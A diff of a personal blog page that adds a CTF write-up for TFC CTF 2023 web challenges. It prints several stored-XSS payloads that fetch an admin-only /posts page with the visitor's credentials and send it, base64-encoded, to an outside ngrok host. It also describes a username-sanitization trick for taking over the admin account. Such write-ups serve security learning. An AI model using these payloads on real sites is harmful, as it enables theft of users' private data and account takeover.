@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>Hello world  | NSS</title>
+<title>TFC CTF 2023 - web challenges 🐱‍💻 | NSS</title>
 <meta name="description" content="Mrecho">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -87,25 +87,109 @@
       <div class="sm-12 md-8 col">
         <div class="paper">
           <article class="article">
-            <h1>Hello world </h1>
+            <h1>TFC CTF 2023 - web challenges 🐱‍💻</h1>
             <p class="article-meta">
-              1929-10-23
-              
-                <a href="https://mrecho123.github.io/tag/wpMBCTwVw/" class="badge secondary">
-                  Firstpost
-                </a>
+              2023-08-03
               
             </p>
             
-              <img src="https://mrecho123.github.io/post-images/hello-world.jpg" alt="Hello world ">
-            
             <div class="post-content">
-              <img src='https://media.giphy.com/media/80Cdy9EteIuOc/giphy.gif'>
+              <p><strong>Hello again , The past weekend I played TFC CTF it was fun 😃 , here is the interesting challenges that I solved in the web category ; enjoy 👌</strong></p>
+<ul class="contains-task-list">
+<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox" id="task-item-4268752"><label class="task-list-item-label" for="task-item-4268752"> Baby ducky notes and the part 2 (revenge)</label></li>
+<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox" id="task-item-981609"><label class="task-list-item-label" for="task-item-981609"> MCTREE</label></li>
+</ul>
+<hr>
+<h2 id="baby-ducky-notes-part-1-2">Baby ducky notes Part 1 &amp; 2</h2>
+<p>Found an stored xss in the posts in<br>
+this help me see aswel <a href="https://xss.report/dashboard">Link to xss tool</a></p>
+<p>Payloads used to grab /posts where only admin bot can access :</p>
+<pre><code class="language-javascript">&lt;script&gt;
+  fetch(&quot;http://localhost:1337/posts&quot;, {
+    method: &quot;GET&quot;,
+    credentials: &quot;include&quot;,
+  })
+    .then((response) =&gt; response.text())
+    .then((html) =&gt; {
+      const base64Html = btoa(html);
+      const img = new Image();
+      img.src = &quot;https://1cc5-41-140-89-213.ngrok-free.app?c=&quot; + encodeURIComponent(base64Html);
+    })
+&lt;/script&gt;
+
+
+
+Local :
+&lt;script&gt;
+  fetch(&quot;http://localhost:1337/posts&quot;, {
+    method: &quot;GET&quot;,
+    credentials: &quot;include&quot;,
+  })
+    .then((response) =&gt; response.text())
+    .then((html) =&gt; {
+      const base64Html = btoa(html);
+      const img = new Image();
+      img.src = &quot;https://1cc5-41-140-89-213.ngrok-free.app?c=&quot; + encodeURIComponent(base64Html);
+    })
+    .catch((error) =&gt; console.error(&quot;Error&quot;, error));
+&lt;/script&gt;
+
+
+
+
+server : 
+
+&lt;script&gt;
+  fetch(&quot;http://challs.tfcctf.com:32728/posts&quot;, {
+    method: &quot;GET&quot;,
+    credentials: &quot;include&quot;,
+  })
+    .then((response) =&gt; response.text())
+    .then((html) =&gt; {
+      const base64Html = btoa(html);
+      const img = new Image();
+      img.src = &quot;https://1cc5-41-140-89-213.ngrok-free.app?c=&quot; + encodeURIComponent(base64Html);
+    })
+    .catch((error) =&gt; console.error(&quot;Error&quot;, error));
+&lt;/script&gt;
+
+</code></pre>
+<p>Final payload :</p>
+<figure data-type="image" tabindex="1"><img src="https://cdn.discordapp.com/attachments/1136817885122154526/1136820462500986960/image.png" alt="img" loading="lazy"></figure>
+<p>Report the posts to admin, then wait for the bot to visit it then boom :</p>
+<p><img src="https://cdn.discordapp.com/attachments/1136817885122154526/1136818055666749540/Pasted_image_20230728210643.png" alt="img" loading="lazy"><br>
+<em>Base64 of /posts includes the flag</em></p>
+<figure data-type="image" tabindex="2"><img src="https://cdn.discordapp.com/attachments/1136817885122154526/1136818054534266960/Pasted_image_20230728210703.png" alt="img" loading="lazy"></figure>
+<h2 id="mctree">Mctree</h2>
+<p><strong>Objective:</strong> login as admin ..</p>
+<p>My thaughts were:</p>
+<blockquote>
+<p>the input is been sanitized from html tags and u should focus on user input manipulation &amp; username set to maximum 12 characters</p>
+</blockquote>
+<p><strong>POC</strong></p>
+<ul>
+<li>register as admin%00:admin</li>
+<li>so when u register a username it strips away those characters &lt;&gt;%^ ; so if</li>
+<li>Regiter as admin&lt;&gt;:admin u overight admins password that it</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://cdn.discordapp.com/attachments/1136817885122154526/1136818055410884708/Pasted_image_20230729122443.png" alt="img" loading="lazy"></figure>
+<p><span style="background-color: #C6BF9C;"> In conclusion : keep better notes when you trying to solve a CTF challenge and try evrything that comes to your mind , and more writeups you read the more ideas you will have , till then C ya 😉 </span></p>
 
             </div>
           </article>
         </div>
         <div class="paper" data-aos="fade-in">
+          
+            <div class="next-post">
+              <div class="next">
+                下一篇
+              </div>
+              <a href="https://mrecho123.github.io/post/cve-2023-001/">
+                <h3 class="post-title">
+                  CVE-2023-001
+                </h3>
+              </a>
+            </div>
           
         </div>
         
@@ -201,7 +285,7 @@
     </div>
     <div class="row">
       
-        <a href="https://mrecho123.github.io/tag/VnWuWwEsW/" class="badge secondary">
+        <a href="https://mrecho123.github.io/tag/VnWuWwEsW/" class="badge warning">
           CTF
         </a>
       
